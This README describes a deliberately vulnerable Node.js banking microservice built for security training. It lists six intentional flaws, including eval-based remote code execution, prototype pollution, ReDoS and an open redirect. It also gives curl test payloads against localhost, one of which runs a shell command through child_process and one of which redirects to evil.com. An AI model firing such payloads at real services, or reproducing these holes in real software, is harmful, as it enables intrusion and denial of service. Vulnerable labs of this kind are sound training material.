# VulnBank Node.js Microservice

Deliberately vulnerable Node.js microservice for security training. Runs on port 3000.

## Setup

```bash
cd microservice
npm install
node index.js
```

Or via Docker:
```bash
docker build -t vulnbank-node .
docker run -p 3000:3000 vulnbank-node
```

## Vulnerabilities

| Endpoint | Method | CWE | Description |
|----------|--------|-----|-------------|
| `/api/merge` | POST | CWE-1321 | Prototype Pollution via `_.merge` |
| `/api/eval` | POST | CWE-94 | Direct `eval()` RCE |
| `/api/regex` | GET | CWE-400 | ReDoS via user-controlled RegExp |
| `/api/serialize` | POST | CWE-94 | Unsafe serialize-javascript |
| `/api/redirect` | GET | CWE-601 | Open Redirect |
| `/api/template` | POST | CWE-94 | SSTI via string concatenation |

## Quick Tests

```bash
# Prototype pollution
curl -X POST http://localhost:3000/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"admin": true}}'

# RCE via eval
curl -X POST http://localhost:3000/api/eval \
  -H 'Content-Type: application/json' \
  -d '{"code": "require(\"child_process\").execSync(\"id\").toString()"}'

# ReDoS (hang the server)
curl "http://localhost:3000/api/regex?pattern=(a%2B)%2B&input=aaaaaaaaaaaaaaaaaaaaaaaaa!"

# Open redirect
curl -v "http://localhost:3000/api/redirect?url=https://evil.com"
```
